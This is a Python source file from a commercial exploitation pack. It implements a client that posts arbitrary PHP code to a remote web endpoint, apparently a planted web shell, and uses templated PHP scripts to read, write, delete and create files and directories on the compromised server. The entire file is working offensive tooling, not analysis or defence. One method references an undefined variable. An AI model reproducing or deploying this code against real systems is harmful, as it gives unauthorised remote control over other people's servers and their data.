#!/usr/bin/env python
# -*- coding: utf-8 -*-

#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2014
#


import httplib
import urllib
import sys
import os
import re
import errno
import base64

class Php:
    PHP_SCRIPTS = os.path.join(os.path.dirname(__file__), 'php/')

    def __init__(self, server, uri):
        self.server = server
        self.uri = uri

    def exec_php(self, code):
        params = urllib.urlencode({ 'x': code })
        headers = {
            'Content-type': 'application/x-www-form-urlencoded',
            'Accept': 'text/plain',
            'Content-Length': len(params)
            }

        conn = httplib.HTTPConnection(self.server)
        conn.request('POST', self.uri, params, headers)
        response = conn.getresponse()
        data = response.read()
        conn.close()

        return data

    def php_error_to_errno(self, msg):
        # /usr/include/asm-generic/errno-base.h
        msg = msg.lower()
        if 'permission denied' in msg:
            return -errno.EACCES
        elif 'file exists' in msg:
            return -errno.EEXIST
        elif 'no such file or directory' in msg or 'stat failed' in msg:
            return -errno.ENOENT
        else:
            return -1


    def readdir_nocache(self, path):
        with open(os.path.join(PHP_SCRIPTS, 'readdir.php')) as fp:
            code = fp.read()
        data = self.exec_php(code % path)
        if '\n' in data:
            return data.split('\n')
        else:
            return self.php_error_to_errno(data)


    def readdir(self, path):
        with open(os.path.join(self.PHP_SCRIPTS, 'readdir_and_getattr.php')) as fp:
            code = fp.read()
            data = self.exec_php(code % path)

        # check if readdir() failed
        if '\n\n' not in data:
            return self.php_error_to_errno(data), None

        readdir_data, getattr_data = data.split('\n\n')
        entries = readdir_data.split('\n')

        getattr_data = getattr_data.rstrip().split('\n')
        stats = []
        for data in getattr_data:
            if 'error' not in data:
                st = data.split(' ')
            else:
                st = self.php_error_to_errno(data)
            stats.append(st)

        return entries, stats


    def getattr(self, path):
        with open(os.path.join(self.PHP_SCRIPTS, 'getattr.php')) as fp:
            code = fp.read()
        data = self.exec_php(code % path)
        if 'error' not in data:
            return data.split(' ')
        else:
            error = data
            return self.php_error_to_errno(error)


    def read(self, path, length, offset):
        with open(os.path.join(self.PHP_SCRIPTS, 'read.php')) as fp:
            code = fp.read()
        data = self.exec_php(code % (path, length, offset))
        # don't check for error, return generic
        return data


    def write(self, path, buf, offset):
        with open(os.path.join(self.PHP_SCRIPTS, 'write.php')) as fp:
            code = fp.read()
        buf = base64.b64encode(buf)
        written = self.exec_php(code % (path, buf, offset))
        print '[*] written: %s' % written
        if 'error' in written:
            error = written
            return self.php_error_to_errno(error)
        else:
            return int(written)


    def generic(self, php_script, *args):
        with open(os.path.join(self.PHP_SCRIPTS, php_script)) as fp:
            code = fp.read()
        error = self.exec_php(code % tuple(args))
        if not error:
            return 0
        else:
            return self.php_error_to_errno(error)


    def open(self, path, mode):
        return self.generic('open.php', path, mode)


    def truncate(self, path, size):
        return self.generic('truncate.php', path, size)


    def mkdir(self, path, mode):
        return self.generic('mkdir.php', path, mode)


    def rmdir(self, path):
        return self.generic('rmdir.php', path)


    def unlink(self, path):
        return self.generic('unlink.php', path)


    def mknod(self, path, mode, dev):
        return self.generic('mknod.php', path, mode, dev)


    def chdir(self, path):
        return self.generic('chdir.php', path)
